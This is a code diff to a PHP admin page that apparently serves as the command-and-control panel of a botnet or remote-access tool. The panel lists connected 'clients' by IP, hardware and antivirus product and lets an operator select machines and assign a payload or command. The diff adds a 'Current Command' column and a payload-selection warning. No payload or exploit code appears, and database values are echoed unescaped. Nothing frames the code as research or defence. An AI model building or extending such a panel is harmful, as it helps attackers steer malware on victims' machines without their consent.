@@ -31,21 +31,22 @@ $clienttable = GetAllClients($dbconn);
     <main>
         <div class="container">
             <form action="set-command.php" method="post">
-                <section class="section">
+                <section class="section">                    
                     <?php 
-                        if(isset($_SESSION['command-fail'])) 
-                        {?>
-                    <div class="notification is-warning">Please select at least 1 client</div>
-
-                    <?php
-                        unset($_SESSION['command-fail']);
+                        if(isset($_SESSION['command-fail']))
+                        {
+                            echo("<div class=\"notification is-warning\"> Please select at least 1 client </div>");
+                            unset($_SESSION['command-fail']);
                         }
-                    ?>
-                    <?php 
                         if(isset($_SESSION['command-succes']))
                         {
                             echo("<div class=\"notification is-primary\">". $_SESSION['command-succes'] ."</div>");
                             unset($_SESSION['command-succes']);
+                        }
+                        if(isset($_SESSION['command-error']))
+                        {
+                            echo("<div class=\"notification is-warning\"> Please select a payload. </div>");
+                            unset($_SESSION['command-error']);                            
                         }
                     ?>
                     <!-- Main content -->                    
@@ -86,12 +87,12 @@ $clienttable = GetAllClients($dbconn);
                             <thead>
                                 <tr>
                                     <th>ID</th>
-                                    <th>IP</th>
-                                    <th>Country</th>
+                                    <th>IP</th>                                    
                                     <th>CPU</th>
                                     <th>RAM</th>
                                     <th>Last online</th>
                                     <th>AV</th>
+                                    <th>Current Command</th>
                                     <th>Select</th>
                                 </tr>
                             </thead>
@@ -101,8 +102,7 @@ $clienttable = GetAllClients($dbconn);
                                 {                                    
                                     echo("<tr>");
                                     echo("<td>". $table['Id'] ."</td>");
-                                    echo("<td>". $table['Ip'] ."</td>");
-                                    echo("<td>". $table['Country'] ."</td>");
+                                    echo("<td>". $table['Ip'] ."</td>");                                    
                                     echo("<td>". $table['CPU'] ."</td>");
                                     echo("<td>". $table['Ram'] ."</td>");
                                     echo("<td>". $table['LastSeen'] ."</td>");
@@ -121,12 +121,12 @@ $clienttable = GetAllClients($dbconn);
                             <thead>
                                 <tr>
                                     <th>ID</th>
-                                    <th>IP</th>
-                                    <th>Country</th>
+                                    <th>IP</th>                                    
                                     <th>CPU</th>
                                     <th>RAM</th>
                                     <th>Last online</th>
                                     <th>AV</th>
+                                    <th>Current Command</th>
                                     <th>Select</th>
                                 </tr>
                             </thead>
@@ -136,12 +136,12 @@ $clienttable = GetAllClients($dbconn);
                                 {                                    
                                     echo("<tr>");
                                     echo("<td>". $table['Id'] ."</td>");
-                                    echo("<td>". $table['Ip'] ."</td>");
-                                    echo("<td>". $table['Country'] ."</td>");
+                                    echo("<td>". $table['Ip'] ."</td>");                                    
                                     echo("<td>". $table['CPU'] ."</td>");
                                     echo("<td>". $table['Ram'] ."</td>");
-                                    echo("<td>". $table['LastSeen'] ."</td>");
+                                    echo("<td>". $table['LastSeen'] ."</td>");                                    
                                     echo("<td>". $table['AntiVirus'] ."</td>");
+                                    echo("<td>". "run" ."</td>");
                                     echo("<td> <input type=\"checkbox\" name=\"check[]\" value=". $table['Id'] ."> </td>");
                                     echo("</tr>");
                                 }
